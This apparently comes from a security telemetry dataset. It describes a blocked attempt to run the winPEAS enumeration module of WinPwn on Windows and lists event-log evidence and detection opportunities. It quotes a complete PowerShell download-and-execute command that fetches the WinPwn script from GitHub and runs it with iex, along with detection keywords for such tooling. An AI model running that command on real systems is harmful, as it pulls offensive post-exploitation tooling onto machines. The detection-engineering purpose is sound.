# T1082-14: System Information Discovery — WinPwn - winPEAS

## Technique Context

T1082 System Information Discovery is a fundamental reconnaissance technique where adversaries gather information about the operating system, hardware, and software environment of compromised systems. This information helps attackers understand the target environment, identify potential privilege escalation paths, locate sensitive data, and plan lateral movement. WinPwn's winPEAS module is a popular post-exploitation tool that automates comprehensive system enumeration on Windows environments, collecting information about users, services, processes, network configurations, installed software, and potential privilege escalation vectors. Detection engineers typically focus on identifying suspicious enumeration patterns, particularly when multiple system information commands are executed in rapid succession or when tools like winPEAS are downloaded and executed from remote sources.

## What This Dataset Contains

This dataset captures a WinPwn winPEAS execution that was blocked by Windows Defender. The primary evidence shows:

**PowerShell Script Execution**: Security event 4688 shows the initial PowerShell command: `"powershell.exe" & {$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t' iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') winPEAS -noninteractive -consoleoutput}`

**Defender Blocking**: PowerShell event 4100 shows the critical failure: "This script contains malicious content and has been blocked by your antivirus software" with error ID "ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand"

**Network Activity**: Sysmon event 22 captures DNS resolution for "raw.githubusercontent.com" with results showing GitHub's CDN IPs (185.199.108-111.133)

**Process Chain**: Sysmon events 1 show the process creation chain including whoami.exe execution (PID 9328) from PowerShell, indicating some enumeration occurred before the main payload was blocked

**PowerShell Module Activity**: Multiple PowerShell events 4104 capture script block creation including the WebClient download attempt and iex (Invoke-Expression) usage

## What This Dataset Does Not Contain

The dataset lacks the actual system information discovery activities that winPEAS would normally perform because Windows Defender successfully blocked the malicious script execution. We don't see the typical T1082 indicators such as multiple system enumeration commands (systeminfo, wmic queries, registry enumeration, service queries), file system discovery activities, or the comprehensive output that winPEAS typically generates. The blocking occurred at the script download/execution phase via Invoke-Expression, so the actual enumeration payload never executed. There are also no Sysmon ProcessCreate events for the main PowerShell processes due to the sysmon-modular include-mode filtering, though Security 4688 events provide the command-line visibility needed.

## Assessment

This dataset provides excellent detection value for identifying attempted system information discovery using popular offensive tools, even when blocked. The combination of Security 4688 command-line logging and PowerShell 4100 error events creates a clear detection pattern for blocked winPEAS execution attempts. The DNS resolution events and process access patterns add additional context for correlation. While we don't see successful T1082 execution, the attempt telemetry is highly valuable for detecting threat actors using common enumeration frameworks. The dataset demonstrates how modern endpoint protection can prevent technique execution while still generating rich telemetry for detection engineering.

## Detection Opportunities Present in This Data

1. **PowerShell download-and-execute pattern** - Security 4688 events showing PowerShell with embedded download commands using New-Object Net.WebClient and downloadstring methods targeting GitHub repositories

2. **winPEAS framework detection** - Command lines containing "winPEAS", "WinPwn", or references to S3cur3Th1sSh1t repositories indicating use of popular enumeration frameworks

3. **Malicious script blocking** - PowerShell 4100 events with "ScriptContainedMaliciousContent" error messages indicating antivirus intervention during attempted payload execution

4. **GitHub-hosted payload retrieval** - DNS queries for "raw.githubusercontent.com" combined with PowerShell execution suggesting remote script download attempts

5. **Invoke-Expression (iex) usage** - PowerShell 4103 and 4104 events showing iex commands which are commonly used in malicious PowerShell execution chains

6. **Process access anomalies** - Sysmon 10 events showing PowerShell accessing other processes (whoami.exe) with full access rights (0x1FFFFF) indicating potential enumeration activities

7. **Enumeration command execution** - Security 4688 events for whoami.exe execution from PowerShell contexts, indicating basic system information discovery attempts
